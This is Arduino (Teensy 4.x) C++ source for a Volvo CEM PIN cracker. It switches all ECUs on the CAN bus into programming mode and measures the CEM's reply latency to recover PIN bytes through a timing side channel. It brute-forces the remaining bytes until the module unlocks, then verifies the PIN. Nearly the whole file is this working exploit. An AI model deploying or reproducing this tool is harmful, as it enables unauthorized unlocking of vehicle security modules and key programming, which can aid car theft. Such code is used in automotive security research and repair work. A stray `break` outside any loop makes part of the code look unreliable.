/* SPDX-License-Identifier: GPL-3.0 */
/*
 * Copyright (C) 2020, 2021 Vitaly Mayatskikh <v.mayatskih@gmail.com>
 *               2020 Christian Molson <christian@cmolabs.org>
 *               2020 Mark Dapoz <md@dapoz.ca>
 *
 * This work is licensed under the terms of the GNU GPL, version 3.
 *
 */

/* Abort button connects GND on PIN 3, normal open */

/* tunable parameters */

//#define  DUMP_BUCKETS        /* dump all buckets for debugging */
#define ABORT_BUTTON  3      /* Abort button to stop operation and reset ECUs */
#define CEM_PN_AUTODETECT    /* comment out for P2 CEM-L on the bench w/o DIM */
#define CPU_CLOCK     true   /* true - to limit CPU by 180 MHz, false - to unlimit CPU frequency. Default value is true */
#define CALC_BYTES    3      /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced. Default value is 3 */
#define KNOWN_BYTES   0      /* how many PIN bytes we know and skip it from calculation. Default value is 0 */
#define initValue     0      /* the initial value for brut-force search. Default value is 0 */
int kpin[6] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };    /* replace 0x00 by values for known PIN bytes. Default values are 0x00 */
bool abort_button = false;

/* end of tunable parameters */

#include <stdio.h>
#include <FlexCAN_T4.h>

#if !defined(__IMXRT1062__)
#error Unsupported Teensy model, need 4.x
#endif

int cem_reply_min;
int cem_reply_avg;
int cem_reply_max;

#define AVERAGE_DELTA_MIN     -8  /* buckets to look at before the rolling average */
#define AVERAGE_DELTA_MAX     12  /* buckets to look at after the rolling average  */

#define CAN_L_PIN    2          /* CAN Rx pin connected to digital pin 2 */

#define CAN_500KBPS 500000      /* 500 Kbit speed */
#define CAN_250KBPS 250000      /* 250 Kbit speed */
#define CAN_125KBPS 125000      /* 125 Kbit speed */

FlexCAN_T4<CAN1, RX_SIZE_256, TX_SIZE_16> can_hs;
FlexCAN_T4<CAN2, RX_SIZE_256, TX_SIZE_16> can_ls;

typedef enum {
  CAN_HS,       /* high-speed bus */
  CAN_LS        /* low-speed bus */
} can_bus_id_t;

/* use the ARM cycle counter as the time-stamp */

#define TSC ARM_DWT_CYCCNT

#define printf Serial.printf

#define CAN_MSG_SIZE    8       /* messages are always 8 bytes */

#define CEM_HS_ECU_ID      0x50
#define CEM_LS_ECU_ID      0x40

#define PIN_LEN         6       /* a PIN has 6 bytes */

unsigned char  shuffle_orders[4][PIN_LEN] = { { 0, 1, 2, 3, 4, 5 }, { 3, 1, 5, 0, 2, 4 }, {5, 2, 1, 4, 0, 3}, { 2, 4, 5, 0, 3, 1} };

unsigned char *shuffle_order;

struct _cem_params {
  unsigned long part_number;
  int baud;
  int shuffle;
} cem_params[] = {
// P1
  { 8690719,  CAN_500KBPS, 0 },
  { 8690720,  CAN_500KBPS, 0 },
  { 8690721,  CAN_500KBPS, 0 },
  { 8690722,  CAN_500KBPS, 0 },
  { 30765471, CAN_500KBPS, 0 },
  { 30728906, CAN_500KBPS, 0 },
  { 30765015, CAN_500KBPS, 0 },
  { 31254317, CAN_500KBPS, 0 },
  { 31327215, CAN_500KBPS, 3 },
  { 31254749, CAN_500KBPS, 3 },
  { 31254903, CAN_500KBPS, 0 },
  { 31296881, CAN_500KBPS, 3 },

// P2 CEM-B (Brick shaped 1999-2004 with K-line)
  { 8645716, CAN_250KBPS, 0 },
  { 8645719, CAN_250KBPS, 0 },
  { 8688434, CAN_250KBPS, 0 },
  { 8688436, CAN_250KBPS, 0 },
  { 8688513, CAN_250KBPS, 2 },
  { 30657629, CAN_250KBPS, 0 },
  { 9494336, CAN_250KBPS, 0 },
  { 9494594, CAN_250KBPS, 0 },
  { 8645171, CAN_250KBPS, 0 },
  { 9452553, CAN_250KBPS, 0 },
  { 8645205, CAN_250KBPS, 0 },
  { 9452596, CAN_250KBPS, 0 },
  { 8602436, CAN_250KBPS, 0 },
  { 9469809, CAN_250KBPS, 0 },
  { 8645200, CAN_250KBPS, 0 },

// P2 CEM-L (L shaped and marked L 2005-2014)
  { 30682981, CAN_500KBPS, 1 },
  { 30682982, CAN_500KBPS, 1 },
  { 30728356, CAN_500KBPS, 1 },
  { 30728542, CAN_500KBPS, 1 },
  { 30765149, CAN_500KBPS, 1 },
  { 30765646, CAN_500KBPS, 1 },
  { 30786475, CAN_500KBPS, 1 },
  { 30786889, CAN_500KBPS, 1 },
  { 31282457, CAN_500KBPS, 1 },
  { 31314468, CAN_500KBPS, 1 },
  { 31394158, CAN_500KBPS, 1 },

// P2 CEM-H (L shaped and marked H 2005 - 2007)
  { 30786476, CAN_500KBPS, 1 },
  { 30728539, CAN_500KBPS, 1 },
  { 30682982, CAN_500KBPS, 1 },
  { 30728357, CAN_500KBPS, 1 },
  { 30765148, CAN_500KBPS, 1 },
  { 30765643, CAN_500KBPS, 1 },
  { 30786476, CAN_500KBPS, 1 },
  { 30786890, CAN_500KBPS, 1 },
  { 30795115, CAN_500KBPS, 1 },
  { 31282455, CAN_500KBPS, 1 },
  { 31394157, CAN_500KBPS, 1 },
  { 30786579, CAN_500KBPS, 1 },
};

/* measured latencies are stored for each of possible value of a single PIN digit */

typedef struct seq {
  uint8_t  pinValue;    /* value used for the PIN digit */
  uint32_t latency;     /* measured latency */
  double std;
} sequence_t;

sequence_t sequence[100] = { 0 };

/* Teensy function to set the core's clock rate */

extern "C" uint32_t set_arm_clock (uint32_t freq);

/* forward declarations */

bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose);

/*******************************************************************************
 *
 * canMsgSend - send message on the CAN bus (FlexCAN_T4 version)
 *
 * Returns: N/A
 */

void canMsgSend (can_bus_id_t bus, uint32_t id, uint8_t *data, bool verbose)
{
  CAN_message_t msg;

  if (verbose == true) {
      printf ("CAN_%cS ---> ID=%08x data= %02x %02x %02x %02x %02x %02x %02x %02x\n",
              bus == CAN_HS ? 'H' : 'L',
              id, data[0], data[1], data[2], data[3], data[4], data[5], data[6], data[7]);
   }

  /* prepare the message to transmit */

  msg.id = id;
  msg.len = 8;
  msg.flags.extended = 1;
  memcpy (msg.buf, data, 8);

  /* send it to the appropriate bus */

  switch (bus) {
    case CAN_HS:
      can_hs.write (msg);
      break;
    case CAN_LS:
      can_ls.write (msg);
      break;
    default:
      break;
  }
}

CAN_message_t can_hs_event_msg;
CAN_message_t can_ls_event_msg;
volatile bool can_hs_event_msg_available = false;
volatile bool can_ls_event_msg_available = false;

/*******************************************************************************
 *
 * canMsgReceive - receive a CAN bus message
 *
 * Note: always processes messages from the high-speed bus
 *
 * Returns: true if a message was available, false otherwise
 */

bool canMsgReceive (can_bus_id_t bus, uint32_t *id, uint8_t *data, int wait, bool verbose)
{
  uint8_t *pData;
  uint32_t canId = 0;
  bool     ret = false;
  volatile bool &msg_avail = (bus == CAN_HS ? can_hs_event_msg_available : can_ls_event_msg_available);
  CAN_message_t &msg = (bus == CAN_HS ? can_hs_event_msg : can_ls_event_msg);

  do {

    /* call FlexCAN_T4's event handler to process queued messages */

    bus == CAN_HS ? can_hs.events() : can_ls.events();

    /* check if a message was available and process it */

    if (msg_avail) {

      /* process the global buffer set by can_hs.events */

      msg_avail = false;
      canId = msg.id;
      pData = msg.buf;
      ret = true;
    } else {
      delay(1);
      wait--;
    }
  } while (!ret && wait);

  /* no message, just return an error */

  if (!ret)
    return ret;

  /* save data to the caller if they provided buffers */

  if (id)
    *id = canId;

  if (data)
    memcpy(data, pData, CAN_MSG_SIZE);

  /* print the message we received */

  if (verbose) {
    printf ("CAN_%cS <--- ID=%08x data= %02x %02x %02x %02x %02x %02x %02x %02x\n",
            bus == CAN_HS ? 'H' : 'L',
            canId, pData[0], pData[1], pData[2], pData[3], pData[4], pData[5], pData[6], pData[7]);
  }

  return ret;
}

/*******************************************************************************
 *
 * binToBcd - convert an 8-bit value to a binary coded decimal value
 *
 * Returns: converted 8-bit BCD value
 */

uint8_t binToBcd (uint8_t value)
{
  return ((value / 10) << 4) | (value % 10);
}

/*******************************************************************************
 *
 * bcdToBin - convert a binary coded decimal value to an 8-bit value
 *
 * Returns: converted 8-bit binary value
 */

uint8_t bcdToBin (uint8_t value)
{
  return ((value >> 4) * 10) + (value & 0xf);
}

/*******************************************************************************
 *
 * profileCemResponse - profile the CEM's response to PIN requests
 *
 * Returns: number of PINs processed per second
 */

uint32_t profileCemResponse (void)
{
  uint8_t  pin[PIN_LEN] = { 0 };
  uint32_t start;
  uint32_t end;
  uint32_t latency;
  uint32_t rate;
  bool     verbose = false;
  uint32_t i;

  cem_reply_avg = 0;

  /* start time in milliseconds */

  start = millis ();

  /* collect the samples */

  for (i = 0; i < 1000; i++) {

    /* average calculation is more reliable using random PIN digits */

    for (int j = 0; j < PIN_LEN; j++)
      pin[j] = binToBcd(random(0, 99));

    /* try and unlock the CEM with the random PIN */

    cemUnlock (pin, NULL, &latency, verbose);

    /* keep a running total of the average latency */

    cem_reply_avg += latency / clockCyclesPerMicrosecond();
  }

  /* end time in milliseconds */

  end = millis ();

  /* calculate the average latency for a single response */

  cem_reply_avg /= 1000;

  cem_reply_min = cem_reply_avg / 2;
  cem_reply_max = cem_reply_avg + cem_reply_min;

  /* number of PINs processed per second */

  rate = 1e6 / (end - start);

  printf ("1000 pins in %u ms, %u pins/s, average response: %u us, histogram %u to %u us \n", (end - start), rate, cem_reply_avg, cem_reply_min, cem_reply_max);
  return rate;
}

volatile bool intr;

/*******************************************************************************
 *
 * cemUnlock - attempt to unlock the CEM with the provided PIN
 *
 * Returns: true if the CEM was unlocked, false otherwise
 */

bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
{
  uint8_t  unlockMsg[CAN_MSG_SIZE] = { CEM_HS_ECU_ID, 0xBE };
  uint8_t  reply[CAN_MSG_SIZE];
  uint8_t *pMsgPin = unlockMsg + 2;
  uint64_t start, end, limit;
  uint32_t id;
  uint32_t maxTime = 0;
  bool press;

  /* shuffle the PIN and set it in the request message */

  for (int i = 0; i < PIN_LEN; i++)
    pMsgPin[i] = pin[shuffle_order[i]];

  /* maximum time to collect our samples */

  limit = TSC + 2 * 1000 * clockCyclesPerMicrosecond();
  intr = false;

  /* send the unlock request */
  canMsgSend (CAN_HS, 0xffffe, unlockMsg, verbose);

  start = end = TSC;
  while (!intr && TSC < limit) {
    /* if the line is high, the CAN bus is either idle or transmitting a bit */

    if (digitalRead(CAN_L_PIN))
      continue;

    /* the CAN bus isn't idle, it's the start of the next bit */

    end = TSC;

    /* we only need to track the longest time we've seen */

    if (end - start > maxTime)
      maxTime = end - start;
    /* start of the next sample */

    start = end;
  }

  /* default reply is set to indicate a failure */

  memset (reply, 0xff, sizeof(reply));

  /* see if anything came back from the CEM */

  canMsgReceive(CAN_HS, &id, reply, 1000, false);

  /* return the maximum time between transmissions that we saw on the CAN bus */

  if (latency)
    *latency = maxTime;

  /* return PIN used if the caller wants it */

  if (pinUsed != NULL) {
    memcpy (pinUsed, pMsgPin, PIN_LEN);
  }

  press = digitalRead( ABORT_BUTTON );
  if ( press == false )
    abort_button = true;

  if ( abort_button == true )
  {
    printf ("\n\nAborted by pressed button\n");
    printf ("Last tried sequence was %02x %02x %02x %02x %02x %02x\n", pin[0], pin[1], pin[2], pin[3], pin[4], pin[5]);
    printf ("based on last tried sequnce the last tried PIN was %02x %02x %02x %02x %02x %02x\n\n", pMsgPin[0], pMsgPin[1], pMsgPin[2], pMsgPin[3], pMsgPin[4], pMsgPin[5]);

    return true;
  }

  /* a reply of 0x00 indicates CEM was unlocked */

  return reply[2] == 0x00;
}

unsigned long ecu_read_part_number(can_bus_id_t bus, unsigned char id)
{
  uint32_t _id;
  uint8_t  data[CAN_MSG_SIZE] = { 0xcb, id, 0xb9, 0xf0, 0x00, 0x00, 0x00, 0x00 };
  uint8_t rcv[CAN_MSG_SIZE];
  bool     verbose = true;
  unsigned long pn = 0;
  int ret;
  int i, j = 0;
  int frame;

  printf("Reading part number from ECU 0x%02x on CAN_%cS\n", id, bus == CAN_HS ? 'H' : 'L');
yet_again:
  canMsgSend(bus, 0xffffe, data, verbose);
  i = 0;
  j++;
  frame = 0;
  if (j > 10)
    return 0;
  do {
again:
    i++;
    if (i > 20)
      goto yet_again;

    ret = canMsgReceive(bus, &_id, rcv, 10, true);
    if (!ret)
      goto again;
    _id &= 0xffff;
    if (bus == CAN_HS && _id != 0x0003UL)
      goto again;
    if (bus == CAN_LS && _id != 0x0003UL && _id != 0x0005UL)
      goto again;
    i = 0;
    if (frame == 0 && rcv[0] & 0x80) {
      pn *= 100; pn += bcdToBin(rcv[5]);
      pn *= 100; pn += bcdToBin(rcv[6]);
      pn *= 100; pn += bcdToBin(rcv[7]);
      frame++;
    } else if (frame == 1 && !(rcv[0] & 0x40)) {
      pn *= 100; pn += bcdToBin(rcv[1]);
      frame++;
    }
  } while(frame < 2);

  printf ("Part Number: %lu\n", pn);
  return pn;
}

unsigned long ecu_read_part_number_prog(can_bus_id_t bus, unsigned char id)
{
  uint32_t _id;
  uint8_t  data[CAN_MSG_SIZE] = { id, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  bool     verbose = true;
  unsigned long pn = 0;

  printf("Reading part number from ECU 0x%02x on CAN_%cS\n", id, bus == CAN_HS ? 'H' : 'L');

  canMsgSend(bus, 0xffffe, data, verbose);
  canMsgReceive(bus, &_id, data, 1000, verbose);

  for (int i = 0; i < 6; i++) {
    pn *= 100;
    pn += bcdToBin(data[2 + i]);
  }

  printf ("Part Number: %lu\n", pn);
  return pn;
}

/*******************************************************************************
 *
 * progModeOn - put all ECUs into programming mode
 *
 * Returns: N/A
 */

void can_prog_mode()
{
  uint8_t  data[CAN_MSG_SIZE] = { 0xFF, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  uint32_t time = 5000;
  uint32_t delayTime = 5;
  bool     verbose = true;

  printf ("Putting all ECUs into programming mode.\n");

  while(canMsgReceive(CAN_HS, NULL, NULL, 1, false));

  /* broadcast a series of PROG mode requests */

  while (time > 0) {
    if ((time % 1000) == 0)
      k_line_keep_alive();

    canMsgSend(CAN_HS, 0xffffe, data, verbose);
    canMsgSend(CAN_LS, 0xffffe, data, verbose);

    verbose = false;
    time -= delayTime;
    delay (delayTime);
  }
  while(canMsgReceive(CAN_HS, NULL, NULL, 1, false));
}

/*******************************************************************************
 *
 * progModeOff - reset all ECUs to get them out of programming mode
 *
 * Returns: N/A
 */

void progModeOff (void)
{
  uint8_t data[CAN_MSG_SIZE] = { 0xFF, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  bool    verbose = true;

  printf ("Resetting all ECUs.\n");

  /* broadcast a series of reset requests */

  for (uint32_t i = 0; i < 50; i++) {
    canMsgSend (CAN_HS, 0xffffe, data, verbose);
    canMsgSend (CAN_LS, 0xffffe, data, verbose);

    verbose = false;
    delay (100);
  }
}

int seq_max_lat(const void *a, const void *b)
{
  sequence_t *_a = (sequence_t *)a;
  sequence_t *_b = (sequence_t *)b;

  return _b->latency - _a->latency;
}

/*******************************************************************************
 *
 * crackPinPosition - attempt to find a specific digit in the PIN 
 *
 * Returns: N/A
 */


void crackPinPosition(uint8_t *pin, uint32_t pos, bool verbose)
{
  uint8_t seq[100];
  int i;
  int ranges[7]  = { 100, 50, 25,  12,   6,   3,   2 };
  int samples[7] = { 10,  20, 50, 100, 200, 300, 400 };

  for (i = 0; i < 100; i++) {
    seq[i] = binToBcd(i);
  }

  for (i = 0; i < 7; i++) {
    crack_range(pin, pos, seq, ranges[i], samples[i], verbose);

    if ( abort_button == true )
      return;
  }
}

void crack_range(uint8_t *pin, int pos, uint8_t *seq, int range, int samples, bool verbose)
{
  int len = sizeof(int) * (cem_reply_max - cem_reply_min);
  uint32_t *histogram = (uint32_t *)malloc(len);
  uint32_t latency;
  uint32_t prod;
  uint32_t sum;
  double std;
  int pin1, pin2;
  int i;
  int k;
  int xmin = cem_reply_avg + AVERAGE_DELTA_MIN;
  int xmax = cem_reply_avg + AVERAGE_DELTA_MAX;

  /* clear collected latencies */

  memset (sequence, 0, sizeof(sequence));

  printf("range %d, samples %d\n", range, samples);
  printf("candidates short list: ");
  for (i = 0; i < min(50, range); i++)
    printf("%02x ", seq[i]);
  if (50 < range)
    printf(" (+ %d more)\n", range - 50);
  printf("\n");
  printf("                   us: ");
  for (i = xmin; i < xmax; i++)
    printf("%5d ", i);
  printf("\n");

  /* iterate over all possible values for the PIN digit */

  for (pin1 = 0; pin1 < range; pin1++) {

    /* set PIN digit */

    pin[pos] = seq[pin1];

    /* print a progress message for each PIN digit we're processing */

    printf ("[ ");

    /* show numerial values for the known digits */

    for (i = 0; i <= pos; i++) {
      printf ("%02x ", pin[i]);
    }

    /* placeholder for the unknown digits */

    while (i < PIN_LEN) {
      printf ("-- ");
      i++;
    }

    printf ("]: ");

    /* clear histogram data for the new PIN digit */

    memset (histogram, 0, len);

    /* iterate over all possible values for the adjacent PIN digit */

    for (pin2 = 0; pin2 < 100; pin2++) {

      /* set PIN digit */

      pin[pos + 1] = binToBcd (pin2);

      /* collect latency measurements the PIN pair */

      for (int j = 0; j < samples; j++) {

        pin[pos + 2] = range < 100 ? random(100, 255) : binToBcd(j % 100);

        /* try and unlock and measure the latency */

        cemUnlock (pin, NULL, &latency, verbose);

        if ( abort_button == true )
          return;
        
        /* calculate the index into the historgram */

        int idx = latency / clockCyclesPerMicrosecond();

        if (idx < cem_reply_min)
          idx = cem_reply_min;

        if (idx >= cem_reply_max)
          idx = cem_reply_max - 1;

        idx -= cem_reply_min;
        /* bump the count for this latency */

        histogram[idx]++;
      }
    }

    /* clear the digits we just used for latency iteration */

    pin[pos + 1] = 0x00;
    pin[pos + 2] = 0x00;

    /* clear statistical values we're calculating */

    prod = 0;
    sum  = 0;

    /* loop over the histogram values */

    for (k = xmin; k < xmax; k++)
      printf ("% 5u ", histogram[k - cem_reply_min]);

    for (k = cem_reply_min; k < cem_reply_max; k++) {
      int l = k - cem_reply_min;
      uint32_t h = histogram[l];

      if (h) {
        prod += h * k;
        sum  += h;
      }
    }

    int mean = sum / (xmax - xmin);
    long x = 0;

    for (k = cem_reply_min; k < cem_reply_max; k++) {
      int l = k - cem_reply_min;
      if (histogram[l])
        x += sq(histogram[l] - mean);
    }
    std = sqrt((double)x / (cem_reply_max - cem_reply_min));

    /* weighted average */

    printf (": latency % 10u; std %3.2f\n", prod, std);

    /* store the weighted average count for this PIN value */

    sequence[pin1].pinValue = pin[pos];
    sequence[pin1].latency  = prod;
    sequence[pin1].std  = std;


#if defined(DUMP_BUCKETS)
    printf ("Average latency: %u\n", cem_reply_avg);

    for (k = 0; k < cem_reply_max - cem_reply_min; k++) {
      if (histogram[k] != 0) {
        printf ("%4u : %5u\n", k + cem_reply_min, histogram[k]);
      }
    }
#endif

  }

  /* sort the collected sequence of latencies */

  qsort (sequence, range, sizeof(sequence_t), seq_max_lat);

  /* print the top range/2 latencies and their PIN value */
  printf("best candidates ordered by latency:\n");
  for (int i = 0; i < range; i++) {
    printf ("%u: %02x lat = %u\n", i, sequence[i].pinValue, sequence[i].latency);
  }
  printf("...\n");

  for (i = 0; i < range; i++)
    seq[i] = sequence[i].pinValue;

  if (range == 2) {
    /* set the digit in the overall PIN */
    pin[pos] = sequence[0].pinValue;
    printf ("pin[%u] choose candidate: %02x\n", pos, pin[pos]);
  }

  free(histogram);
}

/*******************************************************************************
 *
 * cemCrackPin - attempt to find the specified number of bytes in the CEM's PIN
 *
 * Returns: N/A
 */

void cemCrackPin (int knownBytes, int maxBytes, bool verbose)
{
  uint8_t  pin[PIN_LEN];
  uint8_t  pinUsed[PIN_LEN];
  uint32_t start;
  uint32_t end;
  uint32_t percent = 0;
  uint32_t percent_5;
  uint32_t crackRate;
  uint32_t remainingBytes;
  bool     cracked = false;
  int      i;

  printf ("Calculating bytes 0-%u\n", maxBytes - 1);

  /* profile the CEM to see how fast it can process requests */

  crackRate = profileCemResponse ();

  /* start time */

  start = millis ();

  /* set the PIN to all zeros */

  memset (pin, 0x00, sizeof(pin));

  /* to fill the first known bytes into PIN */
  
  for (i = 0; i < knownBytes; i++)
    pin[i] = kpin[i];
  
  /* try and crack each PIN position */

  for (i = knownBytes; i < maxBytes; i++) {
    crackPinPosition (pin, i, verbose);
    
    if ( abort_button == true )
      break;
  }
  
  if ( abort_button == true )
    break;

  /* number of PIN bytes remaining to find */

  remainingBytes = PIN_LEN - maxBytes,

  /* show the result of the cracking */

  printf ("Candidate PIN ");

  /* show numerial values for the known digits */

  for (i=0; i < maxBytes; i++) {
    printf ("%02x ", pin[i]);
  }

  /* placeholder for the remaining digits */

  while (i < PIN_LEN) {
    printf ("-- ");
    i++;
  }

  printf (": brute forcing bytes %u to %u (%u bytes), initial value is %u, will take up to %u seconds\n",
          maxBytes, PIN_LEN - 1, remainingBytes, initValue,
          (uint32_t)((pow (100, remainingBytes) - initValue)/ crackRate));

  /* 5% of the remaining PINs to try */

  percent_5 = (pow (100, (remainingBytes)) - initValue)/20;

  printf ("Progress: ");

  /*
   * Iterate for each of the remaining PIN bytes.
   * Each byte has a value 0-99 so we iterare for 100^remainingBytes values
   */

  for (i = initValue; i < pow (100, (remainingBytes)); i++) {
    uint32_t pinValues = i;

    /* fill in each of the remaining PIN values */

    for (int j = PIN_LEN -1; j >= maxBytes; j--) {
      pin[j] = binToBcd (pinValues % 100);

      /* shift to the next PIN's value */

      pinValues /= 100;
    }

    /* try and unlock with this PIN */

    if (cemUnlock (pin, pinUsed, NULL, verbose)) {

      if ( abort_button == true )
	  	{
        printf ("Last tried brut-force value is %010d\n", i);
    		break;
		  }

      /* the PIN worked, print it and terminate the search */
      
      printf ("done\n");
      printf ("\nfound PIN: %02x %02x %02x %02x %02x %02x",
              pinUsed[0], pinUsed[1], pinUsed[2], pinUsed[3], pinUsed[4], pinUsed[5]);

      cracked = true;
      break;
    }

    /* print a periodic progress message */

    if (((i - initValue) % percent_5) == 0) {
      printf ("%u%%..", percent * 5);
      percent++;
    }
  }

  if ( abort_button == true )
    return;

  /* print "100%" into progress line in case PIN has not been cracked */

   if (cracked == false)
    printf ("%u%%", percent * 5);

  /* print execution summary */

  end = millis ();
  printf ("\nPIN is %scracked in %3.2f seconds\n", cracked ? "" : "NOT ", (end - start) / 1000.0);

  /* validate the PIN if we were able to crack it */

  if (cracked == true) {

    uint8_t data[CAN_MSG_SIZE];
    uint32_t can_id = 0;

    printf ("Validating PIN\n");

    /* send the unlock request to the CEM */

    data[0] = CEM_HS_ECU_ID;
    data[1] = 0xBE;
    data[2] = pinUsed[0];
    data[3] = pinUsed[1];
    data[4] = pinUsed[2];
    data[5] = pinUsed[3];
    data[6] = pinUsed[4];
    data[7] = pinUsed[5];

    canMsgSend (CAN_HS, 0xffffe, data, verbose);

    /* get the response from the CEM */

    memset (data, 0, sizeof(data));

    canMsgReceive(CAN_HS, &can_id, data, 10, false);

    /* verify the response came from the CEM and is a successful reply to our request */

    if ((can_id == 3) &&
      (data[0] == CEM_HS_ECU_ID) && (data[1] == 0xB9) && (data[2] == 0x00)) {
      printf ("PIN verified.\n");
    } else {
      printf ("PIN verification failed!\n");
    }
  }

  printf ("done\n");
}

void can_hs_event (const CAN_message_t &msg)
{
  can_hs_event_msg = msg;
  can_hs_event_msg_available = true;
}

void can_ls_event (const CAN_message_t &msg)
{
  can_ls_event_msg = msg;
  can_ls_event_msg_available = true;
}

void can_ls_init(int baud)
{
  can_ls.begin();
  can_ls.setBaudRate(baud);
  can_ls.enableFIFO();
  can_ls.enableFIFOInterrupt();
  can_ls.setFIFOFilter(ACCEPT_ALL);
  can_ls.onReceive(can_ls_event);
  printf ("CAN low-speed init done.\n");
}

void can_hs_init(int baud)
{
  can_hs.begin();
  can_hs.setBaudRate(baud);
  can_hs.enableFIFO();
  can_hs.enableFIFOInterrupt();
  can_hs.setFIFOFilter(ACCEPT_ALL);
  can_hs.onReceive(can_hs_event);
  printf ("CAN high-speed init done.\n");
}

/*******************************************************************************
 *
 * ext_output1 - called by FlexCAN_T4's receive interrupt handler
 *
 * Returns: N/A
 */

void ext_output1(const CAN_message_t &msg)
{
  intr = 1;
}

void k_line_keep_alive()
{
  unsigned char msg[] = { 0x84, 0x40, 0x13, 0xb2, 0xf0, 0x03, 0x7c };

  Serial3.write(msg, sizeof(msg));
}

bool find_cem_params(unsigned long pn, struct _cem_params *p)
{
  int i;
  int n = sizeof(cem_params) / sizeof(struct _cem_params);

  printf("Searching P/N %lu in %d known CEMs\n", pn, n);
  for (i = 0; i < n; i++) {
    if (cem_params[i].part_number == pn) {
      *p = cem_params[i];
      return true;
    }
  }
  return false;
}

bool initialized = false;

/*******************************************************************************
 *
 * setup - Arduino entry point for hardware configuration
 *
 * Returns: N/A
 */

void setup (void)
{
  bool hs_inited = false;
  /* set up the serial port */

  Serial.begin(115200);
  Serial3.begin(10800); /* K-Line */

  delay (3000);

  /* enable the time stamp counter */

  ARM_DEMCR |= ARM_DEMCR_TRCENA;
  ARM_DWT_CTRL |= ARM_DWT_CTRL_CYCCNTENA;

  /* set up the pin for sampling the CAN bus */
  pinMode (CAN_L_PIN, INPUT_PULLUP);

  /* set up the pin as abort button */
  pinMode (ABORT_BUTTON, INPUT_PULLUP);

  if (CPU_CLOCK)
    set_arm_clock (180000000);

  printf ("CPU Maximum Frequency:   %u\n", F_CPU);
  printf ("CPU Frequency:           %u\n", F_CPU_ACTUAL);
  printf ("Execution Rate:          %u cycles/us\n", clockCyclesPerMicrosecond ());
  printf ("PIN bytes to measure:    %u\n", CALC_BYTES);

  long pn = 0;

#if defined(CEM_PN_AUTODETECT)
  can_hs.begin();
  k_line_keep_alive();
  delay(1000);
  can_ls_init(CAN_125KBPS);
  k_line_keep_alive();
  pn = ecu_read_part_number(CAN_LS, CEM_LS_ECU_ID);

  if (!pn) {// might be CEM-L
    printf("Can't find part number on CAN-LS, trying CAN-HS at 500 Kbps\n");
    can_hs_init(CAN_500KBPS);
    hs_inited = true;
    pn = ecu_read_part_number(CAN_HS, CEM_HS_ECU_ID);
  }
#else
  can_ls_init(CAN_125KBPS);
  can_hs_init(CAN_500KBPS);
  can_prog_mode();
  pn = ecu_read_part_number_prog(CAN_HS, CEM_HS_ECU_ID);
#endif

  struct _cem_params hs_params;
  if (!pn || !find_cem_params(pn, &hs_params)) {
    printf("Unknown CEM part number %lu. Don't know what to do.\n", pn);
    return;
  }

  shuffle_order = shuffle_orders[hs_params.shuffle];
  printf("CAN HS baud rate: %d\n", hs_params.baud);
  printf("PIN shuffle order: %d %d %d %d %d %d\n", shuffle_order[0], shuffle_order[1], shuffle_order[2], shuffle_order[3], shuffle_order[4], shuffle_order[5]);

#if defined(CEM_PN_AUTODETECT)
  if (!hs_inited)
    can_hs_init(hs_params.baud);

  can_prog_mode();
  if (!hs_inited)
      pn = ecu_read_part_number_prog(CAN_HS, CEM_HS_ECU_ID);
#endif

  initialized = true;
  printf ("Initialization done.\n\n");
}

/*******************************************************************************
 *
 * loop - Arduino main loop
 *
 * Returns: N/A
 */

void loop (void)
{
  bool verbose = false;
  bool press;

  if (initialized)
    cemCrackPin (KNOWN_BYTES, CALC_BYTES, verbose);

  /* exit ECU programming mode */

  progModeOff ();

  /* all done, stop */

  for (;;) {
    
    press = digitalRead(ABORT_BUTTON);
    if ( press == false)
	    progModeOff ();
    
  }
}
